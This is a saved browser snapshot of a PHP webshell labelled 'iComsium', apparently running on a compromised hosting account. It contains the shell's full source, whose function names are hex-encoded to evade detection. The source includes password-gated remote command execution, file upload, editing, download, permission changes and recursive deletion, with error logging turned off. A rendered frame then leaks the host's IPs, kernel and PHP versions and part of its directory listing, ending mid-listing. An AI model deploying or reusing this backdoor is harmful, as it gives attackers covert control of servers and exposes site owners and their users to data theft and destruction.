From: <Saved by Blink>
Snapshot-Content-Location: https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/icoshell.php&2=ajx-download
Subject: iComsium
Date: Tue, 26 Aug 2025 00:05:02 +0400
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--BfyQyNsmEo5JvEfn8JoT5WnpEWVSSiDrkeqlzHIO13----"


------MultipartBoundary--BfyQyNsmEo5JvEfn8JoT5WnpEWVSSiDrkeqlzHIO13----
Content-Type: text/html
Content-ID: <frame-56964563E82B9F76B4B7536ECAFDF969@mhtml.blink>
Content-Transfer-Encoding: binary
Content-Location: https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/icoshell.php&2=ajx-download

<!--?php

# by iComsium

error_reporting (0);
set_time_limit (0);
@ini_set ("error_log", null);
@ini_set ("log_errors", 0);
@ini_set ("max_execution_time", 0);
@ini_set ("output_buffering", 0);
@ini_set ("display_errors",  0);

startEncodeFunction ();

$password = '$2y$10$n4zwg3AVo4WhYTFtOXPPKuUh1J/xMoFFFMd95uAZ8qNtq3N3yk7/m'; 
$serv_ip = (!$_SERVER["SERVER_ADDR"]) ? $GLOBALS[49] ($_SERVER["HTTP_HOST"]) : $_SERVER["SERVER_ADDR"];

if (@$GLOBALS[46] ($GLOBALS[47] ($_COOKIE["webshelLoginVerify"]), $password)) {

	fix_data ();

	if ($_GET["2"] == "ajx-rnm") rnmflodir ();
	if ($_GET["2"] == "ajx-del") massDelete ($_GET["0"]);
	if ($_GET["2"] == "ajx-download") die (showFileValue ($_GET["0"], false));
	if ($_GET["2"] == "ajx-chmod" && isset ($_GET["02"])) exchmd ();
	if ($_GET["2"] == "ajx-up" && @$_FILES["post"]["size"] != 0) uploadToDir ();
	if ($_GET["2"] == "ajx-file" && isset ($_POST["post"]) && $GLOBALS[24] ($_GET["0"] . "/" . $_GET["02"])) saveFlCh ();
	if ($_GET["2"] == "ajx-shell") runShell ();

	if (@$_GET["02"] != "") {

		if ($_GET["2"] == "ajx-cdir") createDirectory ();
		if ($_GET["2"] == "ajx-cfl") createMFl ();

	}

	if ($_GET["2"] == "ajx-info") {

		infoTbl ();
		exit ();

	}

	if ($_GET["2"] == "ajx-open") {

		showFiles ();
		exit ();

	}

	if ($_GET["2"] == "ajx-phpinfo") {

		$GLOBALS[48] ();
		exit ();

	}
}

?--><!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-df758d51-21be-4086-94c9-bf5578cf9a9a@mhtml.blink" />
	
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>iComsium</title>
	
</head>
<body>
<!--?php

if (@!$GLOBALS[46] ($GLOBALS[47] ($_COOKIE["webshelLoginVerify"]), $password)) {

	if (@!$GLOBALS[46] ($_POST["password"], $password)) {

?-->

	<center>
		<h2>webshell by iComsium</h2>
		<form method="post">
			<input type="password" name="password" placeholder="password">
			<button type="submit">&nbsp;submit&nbsp;</button>
		</form>
	</center>





	<div class="phdiv border">
		<div class="shellOutput">
			<div id="shellOutput"></div>
			<div class="shellSubmit">
				<b class="pth">shell &gt; </b>
				<input type="text" placeholder=". . ." class="inpbold" id="shellInput" autocomplete="off">
			</div>
		</div>
		<span class="left">
			<br>
			<a class="shact" href="https://bobanevada.com/icoshell.php?0=%3C?=$_GET[" 0"];?="">&amp;2=open"&gt;[ back ]</a>
		</span>
	</div>



<!--?=ajaxTemplate ();?-->







	<div class="phdiv">
		<iframe src="cid:frame-4F3245709996B99D3CFCD21A499B7090@mhtml.blink" 0"];?="">&2=ajx-phpinfo" class="phpinfo"></iframe>
		<span class="left">
			<br>
			<a class="shact" href="https://bobanevada.com/icoshell.php?0=%3C?=$_GET[" 0"];?="">&amp;2=open"&gt;[ back ]</a>
		</span>
	</div>





<table class="mainTable" id="infoTable">

	<!--?=infoTbl ();?-->

</table>

<br>

<div class="shact">

	<a>[ logout ]</a>

	<a href="https://bobanevada.com/icoshell.php?0=%3C?=$_GET[" 0"];?="">&amp;2=shell"&gt;[ shell ]</a>
	<a href="https://bobanevada.com/icoshell.php?0=%3C?=$_GET[" 0"];?="">&amp;2=phpinfo"&gt;[ phpinfo ]</a>

</div>

<br>
<table class="mainTable" id="tableData">

	<!--?=showFiles ();?-->

</table>

<div id="confirModal" class="modal">
	<div class="modal-content">
		<span id="question"></span>
		<span class="frdo">
			<a id="confirmTrue">[ yes ]</a>
			<a id="confirmf">[ no ]</a>
		</span>
	</div>
</div>

<div id="commandModal" class="modal">
	<div class="modal-content">
		<label for="commandInput" id="inputLabelWord"></label>
		<input type="text" id="commandInput" autocomplete="off">
		<span class="frdo">
			<a id="submitCommand">[ submit ]</a>
			<a id="abortCommand">[ cancel ]</a>
		</span>
	</div>
</div>

<!--?=ajaxTemplate ();?-->





" . $GLOBALS[5] ($x[$z]) . " <span class="pth">〉</span>";
		$z++;

	}

	return $path;

}

function fs ($size) {

	if ($size &gt; 1073741824) return $GLOBALS[37] ("%1.2f", $size / 1073741824 )." GiB";
	elseif ($size &gt; 1048576) return $GLOBALS[37] ("%1.2f", $size / 1048576 ) ." MiB";
	elseif ($size &gt; 1024) return $GLOBALS[37] ("%1.2f", $size / 1024 ) ." KiB";
	else return $size ." B";

}

function expandPath($path) {

	if ($GLOBALS[36]("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {

		$GLOBALS[34] ("echo $match[1]", $stdout);

		return $stdout[0] . $match[2];

	}

	return $path;

}

function runShell () {

	$stdout = [];

	if ($GLOBALS[36] ("/^\s*cd\s*(2&gt;&amp;1)?$/", $_POST["post"])) $GLOBALS[35](expandPath ("~"));

	elseif ($GLOBALS[36]("/^\s*cd\s+(.+)\s*(2&gt;&amp;1)?$/", $_POST["post"])) {

		$GLOBALS[35] ($_GET["0"]);
		$GLOBALS[36] ("/^\s*cd\s+([^\s]+)\s*(2&gt;&amp;1)?$/", $_POST["post"], $match);
		$GLOBALS[35] (expandPath ($match[1]));

	}

	else {

		$GLOBALS[35] ($_GET["0"]);
		$GLOBALS[34] ($_POST["post"], $stdout);

	}

	$buff = "";
	foreach ($stdout as $result) $buff .= $GLOBALS[5] ($result) . "<br>";
	die ($GLOBALS[33] () . "|" . $GLOBALS[20] (" ", "&nbsp;", $buff));

}

function perms ($path) {

	$filePerms = $GLOBALS[6] ($path);

	if (($filePerms &amp; 0xC000) == 0xC000) $info = "s";
	elseif (($filePerms &amp; 0xA000) == 0xA000) $info = "l";
	elseif (($filePerms &amp; 0x8000) == 0x8000) $info = "-";
	elseif (($filePerms &amp; 0x6000) == 0x6000) $info = "b";
	elseif (($filePerms &amp; 0x4000) == 0x4000) $info = "d";
	elseif (($filePerms &amp; 0x2000) == 0x2000) $info = "c";
	elseif (($filePerms &amp; 0x1000) == 0x1000) $info = "p";
	else $info = "u";

	$info .= (($filePerms &amp; 0x0100) ? "r" : "-");
	$info .= (($filePerms &amp; 0x0080) ? "w" : "-");
	$info .= (($filePerms &amp; 0x0040) ? (($filePerms &amp; 0x0800) ? "s" : "x" ) : (($filePerms &amp; 0x0800) ? "S" : "-"));

	$info .= (($filePerms &amp; 0x0020) ? "r" : "-");
	$info .= (($filePerms &amp; 0x0010) ? "w" : "-");
	$info .= (($filePerms &amp; 0x0008) ? (($filePerms &amp; 0x0400) ? "s" : "x" ) : (($filePerms &amp; 0x0400) ? "S" : "-"));

	$info .= (($filePerms &amp; 0x0004) ? "r" : "-");
	$info .= (($filePerms &amp; 0x0002) ? "w" : "-");
	$info .= (($filePerms &amp; 0x0001) ? (($filePerms &amp; 0x0200) ? "t" : "x" ) : (($filePerms &amp; 0x0200) ? "T" : "-"));

	return $info;

}

function infoTbl () {

	global $serv_ip;

?&gt;

	
		
			<b>
				( your ip : <!--?=$_SERVER["REMOTE_ADDR"];?--> | serv ip : <!--?=$serv_ip;?--> )
			</b>
			<br>
			<br>
		
	
	
		sys&nbsp; :&nbsp;
		<!--?=$GLOBALS[5] ($GLOBALS[32] ());?-->
	
	
		soft :&nbsp;
		<!--?=$GLOBALS[5] ($_SERVER["SERVER_SOFTWARE"]);?-->
	
	
		php &nbsp;:&nbsp;
		<!--?=$GLOBALS[31] ();?-->
	
	
		disk&nbsp;:&nbsp;
		<!--?=hdd ()["used"];?--> / <!--?=hdd ()["all"];?--> (<!--?=hdd ()["free"];?--> free)
	
	
		<br>
	
	
		<!--?=getPURL ();?-->
	

<!--?php

}

function showFiles () {

	$dir = $GLOBALS[30] ($_GET["0"]);

	if ($GLOBALS[20] ("\\", "/", $GLOBALS[21]($_GET["0"])) == $_GET["0"]) $dir = $GLOBALS[29] (["."], $GLOBALS[28] ($dir, ["..", "."]));
	else $dir = $GLOBALS[29] ([".", ".."], $GLOBALS[28] ($dir, ["..", "."]));

	$str = "
	<tr-->
		[ name ]
		[ size ]
		[ permission ]
		[ modified ]
		[ action ]
	
	
		<hr>
	";

	foreach ($dir as $a) {

		$flpth = $GLOBALS[20] ("\\", "/", $GLOBALS[27] ($_GET["0"] . "/" . $a));
		$dact = "";
		$size = "-";
		$perms = "<a href="https://bobanevada.com/icoshell.php?0=%22%20.%20$_GET[%220%22]%20.%20%22&amp;2=chmod&amp;02=$a">" . perms ($flpth) . "</a>";
		$lm	= $GLOBALS[25] ("Y-m-d H:i", $GLOBALS[26] ($flpth));
		$a	 = $GLOBALS[5] ($a);
		$type  = "<span class="pth">[?]</span>";

		if ($GLOBALS[16] ($flpth)) {

			$type = "<span class="pth">[d]</span>";

			if ($GLOBALS[22] ($flpth)) {

				$a = "<a href="https://bobanevada.com/icoshell.php?0=$flpth&amp;2=open">$a</a>";
				$type = "[d]";

			}

			$dact .= "<a ('file="" name',="" 'cnewfl="" (\'$flpth\',="" \'*data\')')\"="">+file</a> <a ('dir="" name',="" 'cnewdir="" (\'$flpth\',="" \'*data\')')\"="">+dir</a> <a ('$flpth')\"="">up</a> <a ('new="" name',="" 'rnamdirofl="" (\'$flpth\',="" \'*data\')')\"="">rename</a> <a ('delete?',="" 'ajax="" (\'?0="$flpth&amp;2=ajx-del\'," \'notification\')')\"="">del</a>";

		}

		elseif ($GLOBALS[17] ($flpth)) {

			$type = "<span class="pth">[f]</span>";
			$size = fs ($GLOBALS[2] ($flpth));

			if ($GLOBALS[22] ($flpth)) $dact .= "<a href="https://bobanevada.com/icoshell.php?0=$flpth&amp;2=ajx-download" download="&quot; . $GLOBALS[23] ($flpth) . &quot;">download</a> ";

			$dact .= "<a ('new="" name',="" 'rnamdirofl="" (\'$flpth\',="" \'*data\')')\"="">rename</a> <a ('delete?',="" 'ajax="" (\'?0="$flpth&amp;2=ajx-del\'," \'notification\')')\"="">del</a> ";

			if ($GLOBALS[22] ($flpth)) {

				$type = "[f]";
				$a = "<a href="https://bobanevada.com/icoshell.php?0=%22%20.%20$_GET[%220%22]%20.%20%22&amp;2=file&amp;02=$a">$a</a>";

			}
		}

		if ($dact == "") $dact = "-";

		$str .= "

	
		$type&nbsp;
		$a
		$size
		$perms
		$lm
		$dact
	";

	}

	echo $str;

}

function rnmflodir () {

	if (!isset ($_GET["02"])) ;
	if ($_GET["02"] == "") echo "New name cannot be empty";
	elseif ($GLOBALS[19] ($_GET["0"], $GLOBALS[20] ("\\", "/",  $GLOBALS[21]($_GET["0"])) . "/" . $_GET["02"])) echo "Successfully";
	else echo "Failed";

	exit ();

}

function deleteProcess ($dirPath) {

	if ($GLOBALS[17] ($dirPath)) return $GLOBALS[18] ($dirPath);

	elseif ($GLOBALS[16] ($dirPath)) {

		$dirPath = ($GLOBALS[15] ($dirPath, -1) != DIRECTORY_SEPARATOR) ? $dirPath . DIRECTORY_SEPARATOR : $dirPath;
		$files = $GLOBALS[14] ($dirPath . '*');

		foreach ($files as $file) deleteProcess ($file);

		return $GLOBALS[13] ($dirPath);

	}
}

function massDelete ($dirPath) {

	$dataDeleted = deleteProcess ($dirPath);

	if ($GLOBALS[10] ($_GET["0"]) &amp;&amp; $dataDeleted) die ("Successfully deleted some files");
	elseif (!$GLOBALS[10] ($_GET["0"]) &amp;&amp; $dataDeleted) die ("Successfully");
	die ("Failed");

}

function uploadToDir () {

	if (

		$GLOBALS[12] (

			$_FILES["post"]["tmp_name"],
			$_GET["0"] . "/" . $_FILES["post"]["name"]

		)

	) die ("Successfully");

	die ("Failed");

}

function createDirectory () {

	$pathofDir = $_GET["0"] . "/" . $_GET["02"];

	if (!$GLOBALS[10] ($pathofDir)) die (($GLOBALS[11] ($pathofDir)) ? "Successfully" : "Failed");
	else die ("File / folder already exists");

}

function createMFl () {

	$pathofFile = $_GET["0"] . "/" . $_GET["02"];

	if (!$GLOBALS[10] ($pathofFile)) {

		$create = $GLOBALS[4] ($pathofFile, "w");

		echo ($create) ? "Successfully" : "Failed";
		$GLOBALS[1] ($create);

	}
	else echo "File / folder already exists";

	exit ();

}

function exchmd () {

	$flPerm = 0;
	$perm1 = perms ($_GET["0"]);

	if ($GLOBALS[9] ($_GET["02"], "1")) $flPerm |= 0400;
	if ($GLOBALS[9] ($_GET["02"], "2")) $flPerm |= 0040;
	if ($GLOBALS[9] ($_GET["02"], "3")) $flPerm |= 0004;

	if ($GLOBALS[9] ($_GET["02"], "4")) $flPerm |= 0200;
	if ($GLOBALS[9] ($_GET["02"], "5")) $flPerm |= 0020;
	if ($GLOBALS[9] ($_GET["02"], "6")) $flPerm |= 0002;

	if ($GLOBALS[9] ($_GET["02"], "7")) $flPerm |= 0100;
	if ($GLOBALS[9] ($_GET["02"], "8")) $flPerm |= 0010;
	if ($GLOBALS[9] ($_GET["02"], "9")) $flPerm |= 0001;

	$GLOBALS[8] ($_GET["0"], $flPerm);
	$GLOBALS[7] ();

	if ($perm1 != perms ($_GET["0"])) die ("Successfully");

	die ("Failed");

}

function changeAccess () {

	$path = $_GET["0"] . "/" . $_GET["02"];

	$chv = $GLOBALS[6] ($path);

	$a = ($chv &amp; 00400) ? "checked" : "";
	$b = ($chv &amp; 00040) ? "checked" : "";
	$c = ($chv &amp; 00004) ? "checked" : "";
	$d = ($chv &amp; 00200) ? "checked" : "";
	$e = ($chv &amp; 00020) ? "checked" : "";
	$f = ($chv &amp; 00002) ? "checked" : "";
	$g = ($chv &amp; 00100) ? "checked" : "";
	$h = ($chv &amp; 00010) ? "checked" : "";
	$i = ($chv &amp; 00001) ? "checked" : "";

?&gt;

<div class="phpinfo">
	<table class="chTable">
		<tbody><tr>
			<th nowrap="">[ Permission ]</th>
			<th nowrap="">[ Owner ]</th>
			<th nowrap="">[ Group ]</th>
			<th nowrap="">[ Other ]</th>
		</tr>
		<tr>
			<td colspan="4"><hr></td>
		</tr>
		<tr class="trFl">
			<td class="right">Read</td>
			<td class="center"><input type="checkbox" id="b1" <?="$a;?">&gt;</td>
			<td class="center"><input type="checkbox" id="b2" <?="$b;?">&gt;</td>
			<td class="center"><input type="checkbox" id="b3" <?="$c;?">&gt;</td>
		</tr>
		<tr class="trFl">
			<td class="right">Write</td>
			<td class="center"><input type="checkbox" id="b4" <?="$d;?">&gt;</td>
			<td class="center"><input type="checkbox" id="b5" <?="$e;?">&gt;</td>
			<td class="center"><input type="checkbox" id="b6" <?="$f;?">&gt;</td>
		</tr>
		<tr class="trFl">
			<td class="right">Execute</td>
			<td class="center"><input type="checkbox" id="b7" <?="$g;?">&gt;</td>
			<td class="center"><input type="checkbox" id="b8" <?="$h;?">&gt;</td>
			<td class="center"><input type="checkbox" id="b9" <?="$i;?">&gt;</td>
		</tr>
		<tr>
			<th colspan="4">
				<br>
				<a href="https://bobanevada.com/icoshell.php?0=%3C?=$_GET[" 0"];?="">&amp;2=open"&gt;[ cancel ]</a>
				<a>[ submit ]</a>
			</th>
		</tr>
	</tbody></table>
</div>

<!--?=ajaxTemplate ();?-->







<div id="mynotification" class="modal">
	<div class="modal-content" id="notificationBlock">
		<span id="notificationText"></span>
		<span class="frdo">
			<a id="confirmOk">[ ok ]</a>
		</span>
	</div>
</div>



<!--?php

}

function openFile () {

	$path = $_GET["0"] . "/" . $_GET["02"];
	$textareaValue = showFileValue ($path, true);

?-->

<div class="phdiv">
	<textarea id="textAreaId" class="phpinfo left">&lt;?=$textareaValue;?&gt;</textarea>
	<span class="left">
		<br>
		<a href="https://bobanevada.com/icoshell.php?0=%3C?=$_GET[" 0"];?="">&amp;2=open"&gt;[ back ]</a>
		<a>[ save ]</a>
	</span>
</div>

	<!--?=ajaxTemplate ();?-->




</body></html><!--?php

		exit ();

	}

	$GLOBALS[45] ("webshelLoginVerify", $GLOBALS[44] ($_POST["password"]));
	fix_data ();

}

if ($_GET["2"] == "file" && @$GLOBALS[22] ($_GET["0"] . "/" . $_GET["02"])) openFile ();

if ($_GET["2"] == "chmod" && @$GLOBALS[10] ($_GET["0"] . "/" . $_GET["02"])) changeAccess ();

if ($_GET["2"] == "shell") {

?--><!--?php

}

if ($_GET["2"] == "phpinfo") {

?--><!--?php

}

if ($_GET["2"] == "open") {

?--><!--?php

}

function hdd () {

	$hdd["all"] = fs ($GLOBALS[42] ("."));
	$hdd["free"] = fs ($GLOBALS[43] ("."));
	$hdd["used"] = fs ($GLOBALS[42] (".") - $GLOBALS[43] ("."));

	return $hdd;

}

function fix_path () {

	if (!$GLOBALS[10] ($_GET["0"])) {

		$loop = $_GET["0"];

		while (true) {

			if (!$GLOBALS[10] ($loop) && $loop != $GLOBALS[21]($loop)) $loop = $GLOBALS[21]($loop);
			else break;

		}

		if ($loop == "") $loop = __DIR__;

		$_GET["0"] = $loop;

	}
}

function fix_data () {

	$ndIota = ["chmod", "file", "ajx-file"];
	$act	= ["ajx-del", "ajx-rnm", "ajx-up", "ajx-cdir", "ajx-cfl"];
	$read   = ["open", "ajx-open"];
	$reaf 	= ["ajx-download"];
	$reau   = ["ajx-chmod"];
	$unvrs  = ["phpinfo", "ajx-phpinfo", "ajx-info", "shell", "ajx-shell"];
	$all	= $GLOBALS[29] (
		$read, $GLOBALS[29] (
			$act, $GLOBALS[29] (
				$unvrs, $GLOBALS[29] (
					$ndIota, $GLOBALS[29] (
						$reaf, $reau
					)
				)
			)
		)
	);

	if (@$_GET["0"] == "") $_GET["0"] = __DIR__;
	if (@!$GLOBALS[41] ($_GET["2"], $all)) $_GET["2"] = "open";
	if (!$GLOBALS[10] ($_GET["0"]) && !$GLOBALS[41] ($_GET["2"], $act)) fix_path ();
	if ($GLOBALS[17] ($_GET["0"]) && $GLOBALS[41] ($_GET["2"], $read)) $_GET["0"] = $GLOBALS[21]($_GET["0"]);
	if ($GLOBALS[16] ($_GET["0"]) && $GLOBALS[41] ($_GET["2"], $reaf)) $_GET["2"] = "open";

	if (

		($GLOBALS[41] ($_GET["2"], $reau) && !$GLOBALS[10] ($_GET["0"]))

		||

		($GLOBALS[41] ($_GET["2"], $ndIota) && !isset ($_GET["02"]))

		||

		($GLOBALS[41] ($_GET["2"], $ndIota) && @!$GLOBALS[10] ($_GET["0"] . "/" . $_GET["02"]))

		||

		($GLOBALS[41] ($_GET["2"], $act) && !$GLOBALS[10] ($_GET["0"]))

		||

		($GLOBALS[41] ($_GET["2"], $read) && !$GLOBALS[16] ($_GET["0"]))

	) {
		
		$GLOBALS[50] ("HTTP/1.0 500 Internal Server Error");
		exit ();
	
	}

	$_GET["0"] = $GLOBALS[20] ("\\", "/", $GLOBALS[27] ($_GET["0"]));

	return;

}

function getPURL () {

	$loop = $GLOBALS[27] ($_GET["0"]);

	$x = [ $GLOBALS[23] ($loop) ];

	if ($GLOBALS[23] ($loop) == "") {

		$x = [ $loop ];

	}

	$y = [ $GLOBALS[27] ($loop) ];

	while (true) {

		if ($GLOBALS[21]($loop) != $loop) {

			$loop = $GLOBALS[21]($loop);

			($GLOBALS[23] ($loop) == "") ? $GLOBALS[40] ($x, $loop) : $GLOBALS[40] ($x, $GLOBALS[23] ($loop));

			$GLOBALS[40] ($y, $GLOBALS[27] ($loop));

		}

		else break;

	}

	$x = $GLOBALS[39] ($x);
	$y = $GLOBALS[39] ($y);

	$z = 0;
	$path = "";
	$count = $GLOBALS[38] ($x);

	while ($z < $count) {

		$path .= " <a href='?0=" . $y[$z] . "&2=open'--><!--?php

}

function ajaxTemplate () {

?--><!--?php

}

function showFileValue ($file, $row) {

	$open = $GLOBALS[4] ($file, "r");
	$size = ($GLOBALS[2] ($file) == 0) ? 1 : $GLOBALS[2] ($file);
	$val = ($row) ? $GLOBALS[5] ($GLOBALS[3] ($open, $size)) : $GLOBALS[3] ($open, $size);

	$GLOBALS[1] ($open);

	return $val;

}

function saveFlCh () {

	$path = $_GET["0"] . "/" . $_GET["02"];
	$open = $GLOBALS[4] ($path, "w");
	$size = ($GLOBALS[2] ($path) == 0) ? 1 : $GLOBALS[2] ($path);
	$data = $GLOBALS[3] ($open, $size);

	if ($GLOBALS[0] ($open, $_POST["post"]) || $data == $_POST["post"]) echo "Successfully";
	else echo "Failed";

	$GLOBALS[1] ($open);
	exit ();

}
  
function startEncodeFunction () {

	$encFunct = [

		"667772697465",
		"66636C6F7365",
		"66696C6573697A65",
		"6672656164",
		"666F70656E",
		"68746D6C7370656369616C6368617273",
		"66696C657065726D73",
		"636C656172737461746361636865",
		"63686D6F64",
		"7374725F636F6E7461696E73",
		"66696C655F657869737473",
		"6D6B646972",
		"6D6F76655F75706C6F616465645F66696C65",
		"726D646972",
		"676C6F62",
		"737562737472",
		"69735F646972",
		"69735F66696C65",
		"756E6C696E6B",
		"72656E616D65",
		"7374725F7265706C616365",
		"6469726E616D65",
		"69735F7265616461626C65",
		"626173656E616D65",
		"69735F777269746561626C65",
		"64617465",
		"66696C656D74696D65",
		"7265616C70617468",
		"61727261795F64696666",
		"61727261795F6D65726765",
		"7363616E646972",
		"70687076657273696F6E",
		"7068705F756E616D65",
		"676574637764",
		"65786563",
		"6368646972",
		"707265675F6D61746368",
		"737072696E7466",
		"636F756E74",
		"61727261795F72657665727365",
		"61727261795F70757368",
		"696E5F6172726179",
		"6469736B5F746F74616C5F7370616365",
		"6469736B5F667265655F7370616365",
		"6261736536345F656E636F6465",
		"736574636F6F6B6965",
		"70617373776F72645F766572696679",
		"6261736536345F6465636F6465",
		"706870696E666F",
		"676574686F737462796E616D65",
		"686561646572"

	];

	$count = count ($encFunct);

	for ($i = 0; $i < $count; $i++) {

		$n = "";

		for ($x = 0; $x < strlen ($encFunct[$i]) - 1; $x += 2){

			$n .= chr (hexdec ($encFunct[$i][$x].$encFunct[$i][$x+1]));

		}

		$GLOBALS[$i] = $n;

	}
}
-->
------MultipartBoundary--BfyQyNsmEo5JvEfn8JoT5WnpEWVSSiDrkeqlzHIO13----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: cid:css-df758d51-21be-4086-94c9-bf5578cf9a9a@mhtml.blink

@charset "utf-8";

body, input, button, a { color: white; }

body { background: black; font-family: monospace; font-size: 120%; }

.border { border: 1px solid white; }

input, button, .modal-content { border: 1px solid gray; border-radius: 3px; background: transparent; }

hr { border-right: none; border-bottom: none; border-left: none; border-image: initial; border-top: 1px solid gray; }

a { cursor: pointer; text-decoration: none; }

table { border-collapse: collapse; }

iframe { border: 0px; }

textarea { resize: none; }

input, .center, .phdiv { text-align: center; }

.left { text-align: left; float: left; }

.typeTd { width: 0px; }

.mainTable, .tdB { width: 100%; }

.noName { width: 11%; }

.fileAct { width: 20%; }

.shact { width: auto; font-weight: bold; }

.shact, .tdH { white-space: nowrap; }

.pth { color: gray; }

.chTable { width: 40%; left: 30%; }

.chTable, .phdiv { top: 10%; position: absolute; }

.right { text-align: right; }

.phdiv, .modal-content { width: 80%; }

.phdiv { left: 10%; height: 75%; }

.phpinfo { width: 100%; height: 100%; }

.trFl:hover, .trFl:hover a, .bgwhite { background: white; color: black; }

.typehead { width: 1%; }

.modal { display: none; position: fixed; z-index: 1; top: 0px; left: 0px; width: 100%; height: 100%; overflow: auto; background: black; }

.modal-content { border: 2px solid gray; background-color: black; padding: 10px; margin: 0px; position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%); }

.frdo { float: right; }

.lineBreak { line-break: anywhere; }

.shellOutput { text-align: left; overflow: hidden scroll; height: 100%; }

.inpbold { font-weight: bold; border: 0px; text-align: left; }
------MultipartBoundary--BfyQyNsmEo5JvEfn8JoT5WnpEWVSSiDrkeqlzHIO13----
Content-Type: text/html
Content-ID: <frame-4F3245709996B99D3CFCD21A499B7090@mhtml.blink>
Content-Transfer-Encoding: binary
Content-Location: https://bobanevada.com/icoshell.php?0=%3C?=$_GET[

<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-5fe598e1-4856-44b1-b8f7-2cb814f3e8d4@mhtml.blink" />
	
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>iComsium</title>
	
</head>
<body>

<table class="mainTable" id="infoTable">

	
	<tbody><tr>
		<td colspan="2" class="tdH">
			<b>
				( your ip : 185.91.209.26 | serv ip : 185.162.52.192 )
			</b>
			<br>
			<br>
		</td>
	</tr>
	<tr>
		<td class="tdH">sys&nbsp; :&nbsp;</td>
		<td class="tdB">Linux us-phx-web1286.main-hosting.eu 4.18.0-513.9.1.lve.el8.x86_64 #1 SMP Mon Dec 4 15:01:22 UTC 2023 x86_64</td>
	</tr>
	<tr>
		<td class="tdH">soft :&nbsp;</td>
		<td class="tdB">LiteSpeed</td>
	</tr>
	<tr>
		<td class="tdH">php &nbsp;:&nbsp;</td>
		<td class="tdB">8.2.27</td>
	</tr>
	<tr>
		<td class="tdH">disk&nbsp;:&nbsp;</td>
		<td class="tdB">8754.73 GiB / 14183.92 GiB (5429.19 GiB free)</td>
	</tr>
	<tr>
		<td colspan="2"><br></td>
	</tr>
	<tr>
		<td colspan="2" class="tdH"> <a href="https://bobanevada.com/icoshell.php?0=/&amp;2=open">/</a> <span class="pth">〉</span> <a href="https://bobanevada.com/icoshell.php?0=/home&amp;2=open">home</a> <span class="pth">〉</span> <a href="https://bobanevada.com/icoshell.php?0=/home/u757089673&amp;2=open">u757089673</a> <span class="pth">〉</span> <a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains&amp;2=open">domains</a> <span class="pth">〉</span> <a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com&amp;2=open">bobanevada.com</a> <span class="pth">〉</span> <a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=open">public_html</a> <span class="pth">〉</span></td>
	</tr>


</tbody></table>

<br>

<div class="shact">

	<a>[ logout ]</a>

	<a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=shell">[ shell ]</a>
	<a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=phpinfo">[ phpinfo ]</a>

</div>

<br>
<table class="mainTable" id="tableData">

	
	<tbody><tr>
		<th colspan="2" nowrap="">[ name ]</th>
		<th class="noName" nowrap="">[ size ]</th>
		<th class="noName" nowrap="">[ permission ]</th>
		<th class="noName" nowrap="">[ modified ]</th>
		<th class="fileAct" nowrap="">[ action ]</th>
	</tr>
	<tr>
		<td colspan="6"><hr></td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[d]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=open">.</a></td>
		<td class="center">-</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=.">drwxr-xr-x</a></td>
		<td class="center">2025-08-23 00:19</td>
		<td class="right"><a>+file</a> <a>+dir</a> <a>up</a> <a>rename</a> <a>del</a></td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[d]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com&amp;2=open">..</a></td>
		<td class="center">-</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=..">drwxr-xr-x</a></td>
		<td class="center">2025-08-14 14:32</td>
		<td class="right"><a>+file</a> <a>+dir</a> <a>up</a> <a>rename</a> <a>del</a></td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=.htaccess.bk">.htaccess.bk</a></td>
		<td class="center">714 B</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=.htaccess.bk">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/.htaccess.bk&amp;2=ajx-download" download=".htaccess.bk">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[d]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/.private&amp;2=open">.private</a></td>
		<td class="center">-</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=.private">drwxr-xr-x</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a>+file</a> <a>+dir</a> <a>up</a> <a>rename</a> <a>del</a></td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
